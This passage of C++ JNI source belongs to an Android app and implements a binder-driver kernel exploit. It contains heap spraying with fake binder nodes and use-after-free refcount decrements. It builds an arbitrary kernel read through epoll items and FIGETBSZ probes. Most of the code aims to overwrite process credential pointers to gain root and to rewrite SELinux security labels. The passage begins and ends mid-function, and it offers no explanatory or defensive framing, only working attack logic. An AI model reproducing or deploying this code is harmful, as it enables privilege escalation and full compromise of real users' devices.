                        g_security_target_cred + 4,
                        g_security_target_cred_slot,
                        g_security_target_cred, &uid) && uid == 0 &&
                arbitrary_read32_allow_zero(
                        g_security_target_cred + 16,
                        g_security_target_cred_slot,
                        g_security_target_cred, &sgid) && sgid == 0 &&
                reliable_read64_allow_zero(
                        g_security_target_cred + 20,
                        g_security_target_cred_slot,
                        g_security_target_cred, &effective_ids) &&
                effective_ids == 0 &&
                reliable_read64_allow_zero(
                        g_security_target_cred + 28,
                        g_security_target_cred_slot,
                        g_security_target_cred, &fs_ids) && fs_ids == 0;
        g_last_write_observed_usage = static_cast<std::uint32_t>(header);
    }
    return valid;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_validateRawWriteGate(
        JNIEnv* environment, jclass, jlong target, jint victim) {
    std::uint64_t address = static_cast<std::uint64_t>(target);
    bool pass = !g_direct_security_repair;
    int attempts = 0;
    constexpr int kStableGateAttempts = 250;
    for (; !pass && attempts < kStableGateAttempts; ++attempts) {
        pass = validate_direct_write_gate(address, victim);
        if (!pass) {
            usleep(2000);
        }
    }
    char state[288];
    std::snprintf(state, sizeof(state),
            "status=%s stage=null-write-final-gate"
            " armed_no_free=%d reboot_required=%d"
            " victim=%d direct_step=%d attempts=%d"
            " expected_usage=%u observed_usage=%u"
            " target=0x%" PRIx64,
            pass ? "pass" : "miss", pass ? 0 : 1,
            pass ? 0 : 1, victim, g_direct_write_step,
            attempts, g_last_write_expected_usage,
            g_last_write_observed_usage, address);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_prepareRawNullWrite(
        JNIEnv* environment, jclass, jlong target, jint victim,
        jlong raw_pointer, jlong raw_cookie, jstring directory_string) {
    std::uint64_t node = victim > 0 && victim < kRawVictimCount
            ? g_raw_victim_nodes[victim] : 0;
    std::uint64_t address = static_cast<std::uint64_t>(target);
    bool direct_repair = g_direct_security_repair &&
            address == g_security_target_cred + 8 &&
            g_security_target_cred_repair == 0;
    bool direct_quarantine = g_direct_cred_quarantine &&
            g_direct_write_step == 5 &&
            address == g_security_target_cred &&
            quarantine_pointer_valid(node);
    bool direct_terminal_label = g_direct_terminal_cleanup &&
            ((g_direct_write_step == 5 &&
              address == g_security_target_cred +
                      kCredSecurityOffset) ||
             (g_direct_write_step == 6 &&
              address == g_terminal_memfd_inode_security_slot));
    bool direct_target = g_direct_init_target &&
            (address == g_direct_init_real_cred_slot ||
             address == g_direct_init_cred_slot || direct_repair ||
             direct_quarantine || direct_terminal_label) &&
            kernel_address(g_direct_cred_value);
    bool direct_state_valid = true;
    if (g_direct_security_repair) {
        std::uint64_t donor_real_cred = 0;
        std::uint64_t donor_cred = 0;
        std::uint64_t donor_repair = UINT64_MAX;
        std::uint64_t expected_repair = g_direct_write_step == 2
                ? g_direct_init_cred_slot
                : g_direct_write_step == 4
                        ? g_direct_init_real_cred_slot : 0;
        std::uint64_t control_address = g_security_target_cred_slot;
        std::uint64_t expected_control = g_security_target_cred;
        int final_step = g_direct_terminal_cleanup
                ? 6 : g_direct_cred_quarantine ? 5 : 4;
        direct_state_valid = g_direct_write_step >= 1 &&
                g_direct_write_step <= final_step &&
                address == root_write_target(g_direct_write_step) &&
                reliable_read64(g_security_target_real_cred_slot,
                                &donor_real_cred) &&
                donor_real_cred == g_security_target_cred &&
                reliable_read64(g_security_target_cred_slot,
                                &donor_cred) &&
                donor_cred == g_security_target_cred &&
                reliable_read64_allow_zero(
                        g_security_target_cred + 8,
                        control_address, expected_control,
                        &donor_repair) &&
                donor_repair == expected_repair;
        if (direct_state_valid &&
            (g_direct_write_step == 1 || g_direct_write_step == 3)) {
            direct_state_valid = validate_live_security_target();
            for (int snapshot = 0;
                 direct_state_valid && snapshot < 2; ++snapshot) {
                std::uint64_t snapshot_repair = UINT64_MAX;
                direct_state_valid = validate_zero_root_cred_snapshot(
                        g_security_target_task,
                        g_security_target_cred,
                        g_security_target_real_cred_slot,
                        g_security_target_cred_slot,
                        g_security_target_blob, g_fake_security_sid,
                        &snapshot_repair) && snapshot_repair == 0;
            }
        }
    }
    bool legacy_target = !g_direct_init_target &&
            address == root_write_target(victim) &&
            g_fake_security_sid != 0 &&
            kernel_pointer(g_security_target_blob) &&
            kernel_pointer(g_credential_target_security);
    bool credential_target = kernel_pointer(g_arb_cred_address) &&
            (direct_target || legacy_target);
    if (directory_string == nullptr || victim <= 0 ||
        victim >= kRawVictimCount || !kernel_pointer(node) ||
        !kernel_pointer(address) || !g_arb_read_ready ||
        !credential_target || !direct_state_valid ||
        g_null_write_armed ||
        raw_pointer == 0 || raw_cookie == 0 ||
        g_raw_target_handle <= 0) {
        char state[640];
        std::snprintf(state, sizeof(state),
                "status=fail stage=null-write-prepare reason=preflight"
                " victim=%d handle=%d probe_file=0x%" PRIx64
                " main_proc=0x%" PRIx64 " target_proc=0x%" PRIx64
                " probe_stage=%d probe_errno=%d probe_nodes=%d"
                " marker_offset=%d ref_nodes=%d"
                " target_nodes=%d",
                victim, g_raw_target_handle, g_last_binder_probe_file,
                g_last_main_binder_proc, g_last_target_binder_proc,
                g_last_binder_probe_stage, g_last_binder_probe_errno,
                g_last_binder_probe_nodes,
                g_last_binder_probe_marker_offset,
                g_last_binder_ref_nodes, g_last_target_node_nodes);
        return environment->NewStringUTF(state);
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=null-write-prepare reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    if (direct_quarantine) {
        g_direct_quarantine_value = node;
    }
    std::uint64_t next = root_write_value(victim, address);
    std::vector<std::uint8_t> payload = make_fake_node_payload(
            node, next, address, false);
    int prefilled = 0;
    bool prepared = prepare_fake_control_spray(
            payload.data(), &prefilled, true);
    int fd = prepared ? duplicate_binder_fd() : -1;
    CveResult decrement;
    int decrements = 0;
    if (fd >= 0) {
        for (; decrements < kRawDecrementCount; ++decrements) {
            decrement = send_single_decrement(fd, g_raw_target_handle,
                    static_cast<binder_uintptr_t>(raw_pointer),
                    static_cast<binder_uintptr_t>(raw_cookie));
            if (decrement.ioctl_result != 0 ||
                !decrement.failed_reply || decrement.dead_reply) {
                break;
            }
        }
    }
    bool decremented = fd >= 0 && decrements == kRawDecrementCount;
    int blocked = decremented ? activate_fake_control_spray() : 0;
    if (fd >= 0) {
        close(fd);
    }
    int expected = g_fake_control_expected;
    bool stored = expected > 0 && blocked == expected;
    if (!stored) {
        release_fake_control_spray();
    }
    std::string suffix = "." + std::to_string(victim);
    bool free_gate = stored && write_text_file(
            directory + "/controlled-free.enable" + suffix, "0");
    bool enabled = free_gate && write_text_file(
            directory + "/controlled-read.enable" + suffix,
            "status=pass stage=null-write-enable");
    bool pass = prepared && decremented && stored && enabled;
    if (pass) {
        g_null_write_armed = true;
        g_null_write_armed_victim = victim;
        ++g_write_victims_used;
    } else if (stored) {
        int joined = release_fake_control_spray();
        if (joined == expected) {
            ++g_internal_write_misses;
            ++g_write_victims_used;
        }
    }
    char state[448];
    std::snprintf(state, sizeof(state),
            "status=%s stage=null-write-prepare victim=%d"
            " node=0x%" PRIx64 " target=0x%" PRIx64
            " decrements=%d expected_decrements=%d"
            " decrement=%d failed_reply=%d control_blocks=%d"
            " expected_blocks=%d poison=%d prefilled=%d"
            " internal_write_misses=%d used_victims=%d",
            pass ? "pass" : "fail", victim, node, address,
            decrements, kRawDecrementCount, decrement.ioctl_result,
            decrement.failed_reply ? 1 : 0, blocked,
            expected, poisoned_control_count(), prefilled,
            g_internal_write_misses, g_write_victims_used);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_vandam_prism_NativeBridge_rootWriteTarget(
        JNIEnv*, jclass, jint victim) {
    return static_cast<jlong>(root_write_target(victim));
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_completeRawUnlink(
        JNIEnv* environment, jclass, jint worker, jint victim,
        jlong target, jint progress_fd) {
    record_raw_unlink_stage(progress_fd,
            "stage=jni-enter victim=%d worker=%d", victim, worker);
    __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                        "unlink victim=%d checkpoint=enter", victim);
    record_raw_unlink_stage(progress_fd,
            "stage=producer-lock-wait victim=%d worker=%d", victim, worker);
    std::unique_lock<std::mutex> producer_lock(
            g_terminal_resource_producer_mutex);
    record_raw_unlink_stage(progress_fd,
            "stage=producer-lock-acquired victim=%d worker=%d", victim,
            worker);
    std::uint64_t controlled_generation = 0;
    {
        record_raw_unlink_stage(progress_fd,
                "stage=isolated-lock-wait victim=%d worker=%d", victim,
                worker);
        std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
        record_raw_unlink_stage(progress_fd,
                "stage=isolated-lock-acquired victim=%d worker=%d", victim,
                worker);
        if (g_raw_isolated_state == IsolatedRetirementState::kProved &&
            g_raw_controlled_free_pending_victim == -1 &&
            g_raw_controlled_unlinks.count(victim) == 0) {
            controlled_generation = g_raw_isolated_generation;
        }
    }
    if (controlled_generation == 0) {
        record_raw_unlink_stage(progress_fd,
                "stage=controlled-free-evidence-fail victim=%d worker=%d",
                victim, worker);
        return environment->NewStringUTF(
                "status=fail stage=unlink-complete"
                " reason=controlled-free-evidence reboot_required=1");
    }
    auto record_controlled_unlink = [&](bool completed) {
        if (!completed) {
            return false;
        }
        std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
        bool valid = g_raw_isolated_generation == controlled_generation &&
                g_raw_isolated_state == IsolatedRetirementState::kProved &&
                g_raw_controlled_free_pending_victim == -1 &&
                g_raw_controlled_unlinks.count(victim) == 0;
        if (valid) {
            g_raw_controlled_free_pending_victim = victim;
            g_raw_controlled_unlinks.insert(victim);
            bool published = g_raw_controlled_unlinks.count(victim) == 1;
            g_raw_controlled_free_pending_victim = -1;
            return published;
        }
        return false;
    };
    if (victim > 0 &&
        (!g_null_write_armed || g_null_write_armed_victim != victim)) {
        return environment->NewStringUTF(
                "status=fail stage=unlink-complete reason=unarmed"
                " reboot_required=1");
    }
    int expected_before = -1;
    bool victim0_handoff = false;
    record_raw_unlink_stage(progress_fd,
            "stage=fake-control-lock-wait victim=%d worker=%d", victim,
            worker);
    if (victim == 0) {
        std::lock_guard<std::mutex> lock(g_fake_control_mutex);
        record_raw_unlink_stage(progress_fd,
                "stage=fake-control-lock-acquired victim=%d worker=%d",
                victim, worker);
        expected_before = g_fake_control_expected;
        victim0_handoff =
                !g_terminal_fd_retirement_gate.load(
                        std::memory_order_acquire) &&
                !g_raw_arbitrary_handoff_failed &&
                g_raw_arbitrary_retained &&
                g_raw_arbitrary_rearm_worker == worker &&
                !g_fake_control_active && expected_before == 0 &&
                poisoned_control_count_locked() == 1;
    } else {
        std::lock_guard<std::mutex> lock(g_fake_control_mutex);
        record_raw_unlink_stage(progress_fd,
                "stage=fake-control-lock-acquired victim=%d worker=%d",
                victim, worker);
        expected_before = g_fake_control_expected;
    }
    int released = victim0_handoff ? 0 :
            victim == 0 ? -1 : retain_poisoned_control(worker, victim);
    __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                        "unlink victim=%d checkpoint=spray-released count=%d",
                        victim, released);
    record_raw_unlink_stage(progress_fd,
            "stage=spray-release-complete victim=%d worker=%d released=%d",
            victim, worker, released);
    if (released < 0) {
        return environment->NewStringUTF(
                "status=fail stage=unlink-complete reason=worker"
                " reboot_required=1");
    }
    if (victim > 0) {
        g_null_write_armed = false;
        g_null_write_armed_victim = -1;
    }
    std::uint64_t file = g_disclosed_file_address.load();
    std::uint64_t analysed_file = file;
    std::uint64_t epitem = g_disclosed_epitem_address.load();
    if (victim == 0) {
        struct EpitemControl {
            int epoll_fd;
            int watched_fd;
        };
        std::vector<EpitemControl> candidates;
        std::vector<int> file_probes;
        std::vector<std::uint64_t> file_candidates;
        {
            record_raw_unlink_stage(progress_fd,
                    "stage=epitem-lock-wait victim=0 worker=%d", worker);
            std::lock_guard<std::mutex> lock(g_epitem_mutex);
            record_raw_unlink_stage(progress_fd,
                    "stage=epitem-lock-acquired victim=0 worker=%d", worker);
            if (!g_epitem_fds.empty()) {
                int watched_fd = g_epitem_fds[0];
                for (auto epoll = g_epitem_fds.begin() + 1;
                     epoll != g_epitem_fds.end(); ++epoll) {
                    candidates.push_back({*epoll, watched_fd});
                }
            }
            if (g_file_probe_epoll_fds.size() ==
                g_file_probe_fds.size()) {
                for (std::size_t index = 0;
                     index < g_file_probe_fds.size(); ++index) {
                    candidates.push_back({g_file_probe_epoll_fds[index],
                                          g_file_probe_fds[index]});
                }
            }
            file_probes = g_file_probe_fds;
        }
        {
            std::lock_guard<std::mutex> lock(g_file_candidate_mutex);
            file_candidates = g_file_candidates;
        }
        std::uint32_t value = 0;
        std::uint32_t expected_a = static_cast<std::uint32_t>(file + 32);
        std::uint32_t expected_b = static_cast<std::uint32_t>(epitem + 80);
        int matching_files = 0;
        __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                            "unlink checkpoint=file-probes count=%zu",
                            file_probes.size());
        record_raw_unlink_stage(progress_fd,
                "stage=file-probe-scan-before count=%zu",
                file_probes.size());
        int successful_probes = 0;
        int failed_probes = 0;
        std::uint32_t normal_probe = 0;
        std::uint32_t unusual_probe = 0;
        int unusual_probe_fd = -1;
        for (std::size_t index = 0; index < file_probes.size(); ++index) {
            int probe_fd = file_probes[index];
            int probe = 0;
            errno = 0;
            int probe_result = ioctl(probe_fd, FIGETBSZ, &probe);
            if (probe_result == 0) {
                std::uint32_t observed = static_cast<std::uint32_t>(probe);
                if (successful_probes == 0) {
                    normal_probe = observed;
                } else if (observed != normal_probe && unusual_probe_fd < 0) {
                    unusual_probe = observed;
                    unusual_probe_fd = probe_fd;
                }
                ++successful_probes;
                std::uint64_t matched_file = 0;
                int address_matches = 0;
                for (std::uint64_t candidate : file_candidates) {
                    if (static_cast<std::uint32_t>(candidate + 32) ==
                            observed) {
                        matched_file = candidate;
                        ++address_matches;
                    }
                }
                if (address_matches == 1) {
                    g_arb_file_fd = probe_fd;
                    file = matched_file;
                    value = observed;
                    ++matching_files;
                }
            } else {
                ++failed_probes;
            }
        }
        expected_a = static_cast<std::uint32_t>(file + 32);
        if (matching_files == 1) {
            g_disclosed_file_address.store(file);
        }
        record_raw_unlink_stage(progress_fd,
                "stage=file-scan-after matches=%d ok=%d fail=%d normal=0x%x unusual=0x%x unusual_fd=%d analysed=0x%x resolved=0x%x",
                matching_files, successful_probes, failed_probes,
                normal_probe, unusual_probe, unusual_probe_fd,
                static_cast<std::uint32_t>(analysed_file + 32), expected_a);
        bool located = !candidates.empty() && matching_files == 1;
        __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                            "unlink checkpoint=file-located matches=%d candidates=%zu",
                            matching_files, candidates.size());
        int epoll_round = 0;
        while (located && candidates.size() > 1) {
            std::size_t middle = candidates.size() / 2;
            record_raw_unlink_stage(progress_fd,
                    "stage=epitem-round-before round=%d count=%zu",
                    epoll_round, candidates.size());
            for (std::size_t index = 0; index < candidates.size(); ++index) {
                std::uint64_t read_address = index < middle
                        ? file + 32 : epitem + 88;
                bool set = set_epitem_data(candidates[index].epoll_fd,
                                           candidates[index].watched_fd,
                                           read_address - 24);
                if (!set) {
                    located = false;
                    break;
                }
            }
            int probe = 0;
            __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                                "unlink checkpoint=epoll-probe candidates=%zu",
                                candidates.size());
            record_raw_unlink_stage(progress_fd,
                    "stage=epoll-probe-before round=%d count=%zu fd=%d",
                    epoll_round, candidates.size(), g_arb_file_fd);
            errno = 0;
            int probe_result = located
                    ? ioctl(g_arb_file_fd, FIGETBSZ, &probe) : -1;
            int probe_errno = probe_result == 0 ? 0 : errno;
            record_raw_unlink_stage(progress_fd,
                    "stage=epoll-probe-after round=%d rc=%d errno=%d value=0x%x",
                    epoll_round, probe_result, probe_errno,
                    static_cast<std::uint32_t>(probe));
            if (located && probe_result == 0 &&
                static_cast<std::uint32_t>(probe) == expected_b) {
                candidates.erase(candidates.begin() + middle,
                                 candidates.end());
            } else if (located &&
                       static_cast<std::uint32_t>(probe) == expected_a) {
                candidates.erase(candidates.begin(),
                                 candidates.begin() + middle);
            } else {
                located = false;
            }
            ++epoll_round;
        }
        if (located && candidates.size() == 1) {
            g_selected_epoll_fd = candidates[0].epoll_fd;
            g_selected_epoll_watched_fd = candidates[0].watched_fd;
            g_arb_read_ready = true;
        }
        __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                            "unlink checkpoint=epoll-selected located=%d candidates=%zu",
                            located ? 1 : 0, candidates.size());
        bool pre_free_indexed = victim0_handoff &&
                g_raw_arbitrary_rearm_worker == worker;
        bool canonical = false;
        int spray_expected_release = 0;
        bool original_owner = pre_free_indexed;
        if (original_owner) {
            record_raw_unlink_stage(progress_fd,
                    "stage=canonical-lock-wait victim=0 worker=%d", worker);
            std::lock_guard<std::mutex> lock(g_fake_control_mutex);
            record_raw_unlink_stage(progress_fd,
                    "stage=canonical-lock-acquired victim=0 worker=%d",
                    worker);
            auto& original = g_fake_control_slots[
                    g_raw_arbitrary_rearm_worker];
            std::uint32_t safe_check = UINT32_MAX;
            std::uint64_t pointer = 0;
            std::uint64_t cookie = 0;
            std::memcpy(&safe_check, original.payload + 76,
                        sizeof(safe_check));
            std::memcpy(&pointer, original.payload + 88,
                        sizeof(pointer));
            std::memcpy(&cookie, original.payload + 96,
                        sizeof(cookie));
            bool indexed_payload = safe_check == 0 &&
                    pointer == (kIndexedPtrBase |
                            static_cast<std::uint32_t>(worker)) &&
                    cookie == (kIndexedCookieBase |
                            static_cast<std::uint32_t>(worker));
            bool retained_state2 = original.poisoned &&
                    original.poison_victim == 0 && original.created &&
                    !original.rearm_requested.load(
                            std::memory_order_acquire) &&
                    original.state.load(std::memory_order_acquire) == 2;
            bool single_owner_state = !g_fake_control_active &&
                    g_fake_control_expected == 0 &&
                    poisoned_control_count_locked() == 1;
            if (indexed_payload && retained_state2 && single_owner_state) {
                record_raw_unlink_stage(progress_fd,
                        "stage=canonical-dwell-before victim=0 worker=%d",
                        worker);
                usleep(5000);
                record_raw_unlink_stage(progress_fd,
                        "stage=canonical-dwell-after victim=0 worker=%d",
                        worker);
                retained_state2 = original.state.load(
                        std::memory_order_acquire) == 2;
                if (retained_state2) {
                    released = 0;
                    spray_expected_release = 0;
                    canonical = true;
                    g_raw_victim0_canonical_original = false;
                }
            }
            if (canonical) {
                g_raw_arbitrary_retained = false;
                g_raw_retained_worker = -1;
            }
        }
        bool one_poison = false;
        {
            record_raw_unlink_stage(progress_fd,
                    "stage=poison-lock-wait victim=0 worker=%d", worker);
            std::lock_guard<std::mutex> lock(g_fake_control_mutex);
            record_raw_unlink_stage(progress_fd,
                    "stage=poison-lock-acquired victim=0 worker=%d", worker);
            std::set<int> victims;
            one_poison = poisoned_control_count_locked() == 1 &&
                    poisoned_control_victims_locked(&victims) &&
                    victims.count(0) == 1;
        }

        std::uint64_t cred = 0;
        std::uint64_t id_pairs[4] {};
        record_raw_unlink_stage(progress_fd,
                "stage=cred-pointer-before address=0x%" PRIx64,
                file + 160);
        bool cred_valid = g_arb_read_ready &&
                arbitrary_read64(file + 160, &cred) &&
                kernel_pointer(cred);
        record_raw_unlink_stage(progress_fd,
                "stage=cred-pointer-after valid=%d cred=0x%" PRIx64,
                cred_valid ? 1 : 0, cred);
        __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                            "unlink checkpoint=cred-pointer valid=%d cred=0x%" PRIx64,
                            cred_valid ? 1 : 0, cred);
        for (int index = 0; cred_valid && index < 4; ++index) {
            record_raw_unlink_stage(progress_fd,
                    "stage=cred-id-before index=%d address=0x%" PRIx64,
                    index, cred + 4 + index * 8);
            cred_valid = arbitrary_read64(cred + 4 + index * 8,
                                          &id_pairs[index]);
            record_raw_unlink_stage(progress_fd,
                    "stage=cred-id-after index=%d valid=%d value=0x%" PRIx64,
                    index, cred_valid ? 1 : 0, id_pairs[index]);
            __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect",
                                "unlink checkpoint=cred-id index=%d valid=%d",
                                index, cred_valid ? 1 : 0);
        }
        std::uint32_t uid = static_cast<std::uint32_t>(getuid());
        std::uint32_t gid = static_cast<std::uint32_t>(getgid());
        std::uint64_t expected_ids = uid |
                (static_cast<std::uint64_t>(gid) << 32U);
        for (std::uint64_t pair : id_pairs) {
            cred_valid = cred_valid && pair == expected_ids;
        }

        std::vector<std::uint64_t> node_candidates;
        {
            record_raw_unlink_stage(progress_fd,
                    "stage=node-candidate-lock-wait victim=0 worker=%d",
                    worker);
            std::lock_guard<std::mutex> lock(g_node_candidate_mutex);
            record_raw_unlink_stage(progress_fd,
                    "stage=node-candidate-lock-acquired victim=0 worker=%d",
                    worker);
            node_candidates = g_node_candidates;
        }
        bool pass = located && pre_free_indexed && canonical &&
                cred_valid && one_poison;
        if (pass) {
            g_arb_cred_address = cred;
        }
        record_raw_unlink_stage(progress_fd,
                "stage=acknowledge-before victim=0 pass=%d", pass ? 1 : 0);
        bool acknowledged = record_controlled_unlink(pass);
        record_raw_unlink_stage(progress_fd,
                "stage=acknowledge-after victim=0 acknowledged=%d",
                acknowledged ? 1 : 0);
        pass = pass && acknowledged;
        char state[1400];
        std::snprintf(state, sizeof(state),
                "status=%s stage=arb-read-complete worker=%d"
                " released=%d expected_release=%d poison=%d"
                " initial=0x%x expected=0x%x matching_files=%d"
                " selected_fd=%d selected_watched_fd=%d"
                " candidates=%zu handoff=%d pre_free_indexed=%d"
                " post_free_node_read=0 retained_worker=%d"
                " canonical=%d original_owner=%d one_poison=%d"
                " acknowledged=%d"
                " reboot_required=%d"
                " cred=0x%" PRIx64
                " uid=%u gid=%u ids_valid=%d",
                pass ? "pass" : "fail", worker,
                released, spray_expected_release,
                poisoned_control_count(), value,
                expected_a, matching_files, g_selected_epoll_fd,
                g_selected_epoll_watched_fd,
                node_candidates.size(), victim0_handoff ? 1 : 0,
                pre_free_indexed ? 1 : 0, worker, canonical ? 1 : 0,
                original_owner ? 1 : 0, one_poison ? 1 : 0,
                acknowledged ? 1 : 0,
                pass ? 0 : 1,
                cred, uid, gid,
                cred_valid ? 1 : 0);
        record_raw_unlink_stage(progress_fd,
                "stage=return victim=0 pass=%d matches=%d ok=%d fail=%d normal=0x%x unusual=0x%x unusual_fd=%d expected=0x%x selected_fd=%d watched_fd=%d",
                pass ? 1 : 0, matching_files, successful_probes,
                failed_probes, normal_probe, unusual_probe,
                unusual_probe_fd, expected_a, g_selected_epoll_fd,
                g_selected_epoll_watched_fd);
        return environment->NewStringUTF(state);
    }

    std::uint64_t address = static_cast<std::uint64_t>(target);
    std::uint64_t value = UINT64_MAX;
    bool last_write = victim == kRawVictimCount - 1;
    std::uint64_t expected_value = root_write_value(victim, address);
    bool completion_quarantine = g_direct_cred_quarantine &&
            g_direct_write_step == 5 &&
            address == g_security_target_cred &&
            expected_value == g_direct_quarantine_value;
    bool completion_terminal_label = g_direct_terminal_cleanup &&
            (g_direct_write_step == 5 || g_direct_write_step == 6) &&
            ((g_direct_write_step == 5 &&
              address == g_security_target_cred +
                      kCredSecurityOffset &&
              expected_value == g_terminal_ueventd_security) ||
             (g_direct_write_step == 6 &&
              address == g_terminal_memfd_inode_security_slot &&
              expected_value == g_terminal_vendor_inode_security));
    std::uint64_t zero_control_address = g_security_target_cred_slot;
    std::uint64_t zero_expected_control = g_security_target_cred;
    bool read_back = g_direct_security_repair
            ? reliable_read64_allow_zero(
                    address, zero_control_address,
                    zero_expected_control, &value)
            : reliable_read64(address, &value);
    bool value_valid = read_back && value == expected_value;
    if (completion_quarantine) {
        std::uint64_t second_value = UINT64_MAX;
        bool second_read = reliable_read64_allow_zero(
                address, zero_control_address,
                zero_expected_control, &second_value);
        value_valid = read_back && second_read &&
                quarantined_header_valid(value, expected_value) &&
                quarantined_header_valid(second_value, expected_value);
        read_back = read_back && second_read;
        value = second_value;
    }
    bool validation_deferred = !g_direct_security_repair && !read_back &&
            (victim == 1 || victim == 2);
    bool release_valid = released == expected_before - 1;
    std::uint64_t target_effective = UINT64_MAX;
    bool target_effective_read = g_credential_target_external &&
            reliable_read64(g_arb_cred_address + 20,
                            &target_effective);
    bool direct_sequence_valid = true;
    bool collateral_read = false;
    bool collateral_valid = true;
    bool final_slots_valid = true;
    bool final_donor_valid = true;
    bool final_donor_live_valid = true;
    bool final_donor_live_after_valid = true;
    bool final_donor_snapshot_valid = true;
    bool final_donor_repair_valid = true;
    bool final_donor_usage_valid = true;
    int final_donor_attempts = 0;
    int final_donor_coherent = 0;
    int final_donor_live_stage = 0;
    int final_donor_live_after_stage = 0;
    int final_donor_snapshot_stage = 0;
    std::uint32_t final_donor_expected_usage_low = 0;
    std::uint32_t final_donor_expected_usage_high = 0;
    std::uint32_t final_donor_observed_usage = UINT32_MAX;
    std::uint64_t collateral = UINT64_MAX;
    if (g_direct_security_repair) {
        direct_sequence_valid = g_direct_write_step >= 1 &&
                g_direct_write_step <=
                        (g_direct_terminal_cleanup ? 6 :
                                g_direct_cred_quarantine ? 5 : 4) &&
                address == root_write_target(g_direct_write_step);
        bool completion_repair =
                address == g_security_target_cred + 8;
        std::uint64_t collateral_address =
                completion_terminal_label
                ? g_direct_write_step == 5
                        ? g_terminal_ueventd_security + 8
                        : g_terminal_vendor_inode_security + 8
                : g_security_target_cred + 8;
        std::uint64_t expected_collateral = completion_terminal_label
                ? address
                : completion_repair || completion_quarantine ? 0 : address;
        collateral_read = completion_terminal_label
                ? reliable_read64(collateral_address, &collateral)
                : reliable_read64_allow_zero(
                        collateral_address, zero_control_address,
                        zero_expected_control, &collateral);
        collateral_valid = collateral_read &&
                collateral == expected_collateral;
        if (completion_terminal_label) {
            std::uint64_t final_real_cred = 0;
            std::uint64_t final_cred = 0;
            bool slots_read = reliable_read64(
                        g_direct_init_real_cred_slot, &final_real_cred) &&
                    reliable_read64(
                        g_direct_init_cred_slot, &final_cred);
            std::uint64_t module_label = 0;
            bool module_label_read = reliable_read64(
                    g_terminal_memfd_inode_security_slot,
                    &module_label);
            bool expected_module_label = g_direct_write_step == 5
                    ? module_label ==
                            g_terminal_memfd_inode_security_original
                    : module_label == g_terminal_vendor_inode_security;
            final_slots_valid = slots_read &&
                    final_real_cred == g_direct_cred_value &&
                    final_cred == g_direct_cred_value &&
                    module_label_read && expected_module_label;
        } else if (g_direct_write_step >= 4) {
            std::uint64_t final_real_cred = 0;
            std::uint64_t final_cred = 0;
            final_slots_valid = reliable_read64(
                    g_direct_init_real_cred_slot, &final_real_cred) &&
                    final_real_cred == g_direct_cred_value &&
                    reliable_read64(g_direct_init_cred_slot,
                                    &final_cred) &&
                    final_cred == g_direct_cred_value;
        }
        if (completion_terminal_label) {
            final_donor_valid = validate_terminal_swapped_donor();
            std::uint64_t donor_header = 0;
            final_donor_valid = final_donor_valid &&
                    reliable_read64_allow_zero(
                            g_security_target_cred,
                            g_security_target_cred_slot,
                            g_security_target_cred, &donor_header) &&
                    static_cast<std::uint32_t>(donor_header) ==
                            g_security_target_baseline_usage + 2U;
            final_donor_expected_usage_low =
                    g_security_target_baseline_usage + 2U;
            final_donor_expected_usage_high =
                    final_donor_expected_usage_low;
            final_donor_observed_usage =
                    static_cast<std::uint32_t>(donor_header);
        } else if (completion_quarantine) {
            std::uint64_t donor_real_cred = 0;
            std::uint64_t donor_cred = 0;
            final_donor_valid = quarantined_header_valid(
                            value, g_direct_quarantine_value) &&
                    validate_live_security_target() &&
                    reliable_read64(g_security_target_real_cred_slot,
                                    &donor_real_cred) &&
                    donor_real_cred == g_security_target_cred &&
                    reliable_read64(g_security_target_cred_slot,
                                    &donor_cred) &&
                    donor_cred == g_security_target_cred;
        } else if (completion_repair) {
            final_donor_expected_usage_low =
                    g_security_target_baseline_usage +
                    (!g_direct_terminal_cleanup &&
                     g_direct_write_step >= 4 ? 2U : 0U);
            final_donor_expected_usage_high =
                    g_direct_terminal_cleanup
                            ? final_donor_expected_usage_low
                            : g_security_target_baseline_usage + 2U;
            std::uint32_t previous_usage = UINT32_MAX;
            final_donor_valid = false;
            for (int attempt = 0;
                 attempt < 16 && !final_donor_valid; ++attempt) {
                ++final_donor_attempts;
                std::uint64_t final_repair = UINT64_MAX;
                final_donor_live_valid = validate_live_security_target();
                final_donor_live_stage = g_live_security_target_stage;
                final_donor_live_after_valid = false;
                final_donor_live_after_stage = 0;
                final_donor_snapshot_stage = 0;
                final_donor_snapshot_valid = final_donor_live_valid &&
                        validate_zero_root_cred_snapshot(
                                g_security_target_task,
                                g_security_target_cred,
                                g_security_target_real_cred_slot,
                                g_security_target_cred_slot,
                                g_security_target_blob,
                                g_fake_security_sid, &final_repair);
                if (final_donor_live_valid) {
                    final_donor_snapshot_stage = g_zero_snapshot_stage;
                }
                if (final_donor_snapshot_valid) {
                    final_donor_live_after_valid =
                            validate_live_security_target();
                    final_donor_live_after_stage =
                            g_live_security_target_stage;
                }
                final_donor_repair_valid =
                        final_donor_snapshot_valid && final_repair == 0;
                final_donor_observed_usage = final_donor_snapshot_valid
                        ? static_cast<std::uint32_t>(
                                g_zero_snapshot_header)
                        : UINT32_MAX;
                final_donor_usage_valid =
                        final_donor_snapshot_valid &&
                        (final_donor_observed_usage ==
                                 final_donor_expected_usage_low ||
                         final_donor_observed_usage ==
                                 final_donor_expected_usage_high);
                bool coherent = final_donor_live_valid &&
                        final_donor_live_after_valid &&
                        final_donor_snapshot_valid &&
                        final_donor_repair_valid &&
                        final_donor_usage_valid;
                if (coherent &&
                    final_donor_observed_usage == previous_usage) {
                    ++final_donor_coherent;
                } else {
